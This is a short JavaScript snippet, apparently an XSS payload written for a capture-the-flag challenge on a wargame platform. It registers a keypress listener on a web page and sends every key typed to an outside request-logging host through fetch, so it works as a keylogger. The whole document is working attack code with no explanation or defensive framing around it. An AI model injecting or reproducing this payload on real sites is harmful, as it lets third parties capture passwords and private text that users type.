document.addEventListener('keypress', e => {
  fetch("https://hdsvdrd.request.dreamhack.games/log?k="+e.key);
});
